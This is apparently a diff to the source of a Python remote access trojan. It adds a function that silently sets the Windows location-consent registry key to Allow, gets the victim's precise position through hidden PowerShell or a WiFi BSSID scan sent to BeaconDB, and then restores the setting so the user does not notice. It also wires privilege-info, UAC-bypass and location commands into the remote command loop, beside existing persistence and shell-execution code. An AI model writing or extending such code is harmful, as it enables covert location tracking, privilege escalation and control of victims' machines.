@@ -1008,6 +1008,170 @@ def uac_bypass_fodhelper():
         return json.dumps({"type": "UAC_BYPASS", "status": "error", "message": str(e)})
 
 
+def wifi_scan_precise_location():
+    """Scan nearby WiFi BSSIDs and use Mozilla Location Services for precise location."""
+    import re as _re, urllib.request as _req, json as _json
+
+    result = {"type": "WIFI_SCAN"}
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # STEP 0 — Silently enable Windows Location Services via HKCU registry
+    # (No admin needed — HKCU is user-level, changes instantly, fully silent)
+    # Windows Location API + netsh BSSID both need location ON to work.
+    # We save old value and restore it after, so the user never notices.
+    # ══════════════════════════════════════════════════════════════════════════
+    _LOC_KEY = r"SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\location"
+    _old_val = None
+
+    if platform.system() == "Windows":
+        import winreg as _reg
+        try:
+            hk = _reg.OpenKey(_reg.HKEY_CURRENT_USER, _LOC_KEY, 0, _reg.KEY_READ | _reg.KEY_WRITE)
+            try:
+                _old_val, _ = _reg.QueryValueEx(hk, "Value")
+            except FileNotFoundError:
+                _old_val = "Deny"          # was not set → default Deny
+            _reg.SetValueEx(hk, "Value", 0, _reg.REG_SZ, "Allow")
+            _reg.CloseKey(hk)
+        except Exception:
+            pass                           # if registry edit fails, continue anyway
+
+    def _restore_location_setting():
+        """Restore HKCU location setting to what it was before."""
+        if platform.system() != "Windows" or _old_val is None:
+            return
+        try:
+            import winreg as _reg2
+            hk = _reg2.OpenKey(_reg2.HKEY_CURRENT_USER, _LOC_KEY, 0, _reg2.KEY_WRITE)
+            _reg2.SetValueEx(hk, "Value", 0, _reg2.REG_SZ, _old_val)
+            _reg2.CloseKey(hk)
+        except Exception:
+            pass
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # METHOD 1 — Windows Location API (GPS + WiFi + Cell tower, most accurate)
+    # Uses System.Device.Location — built into Windows, no API key needed
+    # ══════════════════════════════════════════════════════════════════════════
+    if platform.system() == "Windows":
+        ps_code = r"""
+try {
+    Add-Type -AssemblyName System.Device
+    $w = New-Object System.Device.Location.GeoCoordinateWatcher("High")
+    $w.Start()
+    $limit = (Get-Date).AddSeconds(10)
+    while ($w.Status -ne 'Ready' -and (Get-Date) -lt $limit) {
+        Start-Sleep -Milliseconds 400
+    }
+    $c = $w.Position.Location
+    $w.Stop()
+    if ($c.IsUnknown) { Write-Output "UNKNOWN" }
+    else { Write-Output "$($c.Latitude)|$($c.Longitude)|$($c.HorizontalAccuracy)" }
+} catch { Write-Output "ERROR|$($_.Exception.Message)" }
+"""
+        try:
+            ps = subprocess.run(
+                ["powershell", "-NoProfile", "-NonInteractive", "-Command", ps_code],
+                capture_output=True, text=True, timeout=18,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            )
+            out = ps.stdout.strip()
+            if out and "|" in out and not out.startswith(("ERROR", "UNKNOWN")):
+                parts = out.split("|")
+                lat = float(parts[0])
+                lon = float(parts[1])
+                acc = float(parts[2]) if len(parts) > 2 and parts[2].strip() else None
+                _restore_location_setting()
+                return _json.dumps({
+                    **result, "status": "success",
+                    "lat": lat, "lon": lon, "accuracy": acc,
+                    "method": "Windows Location API (GPS/WiFi/Cell)",
+                    "wifi_count": "auto"
+                })
+        except Exception:
+            pass  # fallback to method 2
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # METHOD 2 — WiFi BSSID scan + BeaconDB (open MLS replacement, free)
+    # ══════════════════════════════════════════════════════════════════════════
+    bssids = []
+    if platform.system() == "Windows":
+        try:
+            raw = subprocess.run(
+                ["netsh", "wlan", "show", "networks", "mode=bssid"],
+                capture_output=True, text=True, timeout=10,
+                creationflags=subprocess.CREATE_NO_WINDOW
+            ).stdout
+            cur = None
+            for line in raw.splitlines():
+                line = line.strip()
+                m = _re.search(r'BSSID\s+\d+\s*:\s*([0-9A-Fa-f:]{17})', line)
+                if m:
+                    cur = m.group(1)
+                    continue
+                if cur and line.startswith("Signal"):
+                    sig_m = _re.search(r'(\d+)%', line)
+                    if sig_m:
+                        pct  = int(sig_m.group(1))
+                        dbm  = int((pct / 2) - 100)
+                        bssids.append({"macAddress": cur, "signalStrength": dbm})
+                        cur = None
+        except Exception:
+            pass
+    else:
+        try:
+            raw = subprocess.run(["iwlist", "scan"],
+                                 capture_output=True, text=True, timeout=10).stdout
+            for m in _re.finditer(r'Address:\s*([0-9A-Fa-f:]{17})', raw):
+                tail = raw[raw.find(m.group(0)):]
+                sig_m = _re.search(r'Signal level=(-?\d+)', tail)
+                sig = int(sig_m.group(1)) if sig_m else -70
+                bssids.append({"macAddress": m.group(1), "signalStrength": sig})
+        except Exception:
+            pass
+
+    if bssids:
+        # Try BeaconDB (open replacement for the discontinued Mozilla Location Services)
+        for api_url in [
+            "https://beacondb.net/v1/geolocate",
+            "https://api.beacondb.net/v1/geolocate",
+        ]:
+            try:
+                payload = _json.dumps({"wifiAccessPoints": bssids[:20]}).encode()
+                req = _req.Request(
+                    api_url, data=payload,
+                    headers={"Content-Type": "application/json",
+                             "User-Agent": "Mozilla/5.0"},
+                    method="POST"
+                )
+                with _req.urlopen(req, timeout=8) as resp:
+                    data = _json.loads(resp.read().decode())
+                loc = data.get("location", {})
+                acc = data.get("accuracy")
+                if loc.get("lat") and loc.get("lng"):
+                    _restore_location_setting()
+                    return _json.dumps({
+                        **result, "status": "success",
+                        "lat": loc["lat"], "lon": loc["lng"],
+                        "accuracy": acc,
+                        "method": "WiFi BSSID (BeaconDB)",
+                        "wifi_count": len(bssids)
+                    })
+            except Exception:
+                continue
+
+    # ══════════════════════════════════════════════════════════════════════════
+    # METHOD 3 — Nothing worked
+    # ══════════════════════════════════════════════════════════════════════════
+    if not bssids:
+        msg = ("Windows Location API unavailable — check Settings → Privacy → Location.\n"
+               "Also make sure WiFi adapter is ON for WiFi-based triangulation.")
+    else:
+        msg = (f"Found {len(bssids)} WiFi networks but geolocation APIs unreachable.\n"
+               "Check internet connection on this machine.")
+    _restore_location_setting()
+    return _json.dumps({**result, "status": "error", "message": msg})
+
+
 def _add_persistence():
     """Add to Windows startup registry (HKCU Run) for persistence."""
     if platform.system() == "Windows":
@@ -1670,11 +1834,20 @@ def main_loop():
                             result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                             output = result.stdout if result.stdout else result.stderr
                     
+                    elif cmd == "PRIV_INFO":
+                        output = get_privilege_info().encode()
+
+                    elif cmd == "UAC_BYPASS":
+                        output = uac_bypass_fodhelper().encode()
+
+                    elif cmd == "WIFI_SCAN":
+                        output = wifi_scan_precise_location().encode()
+
                     else:
                         # Command aliases for cross-platform compatibility
                         cmd_stripped = cmd.strip()
                         cmd_lower = cmd_stripped.lower()
-                        
+
                         # Handle common Linux commands that might be typed
                         if cmd_lower == "ls- la" or cmd_lower == "ls-la":
                             cmd = "ls -la"
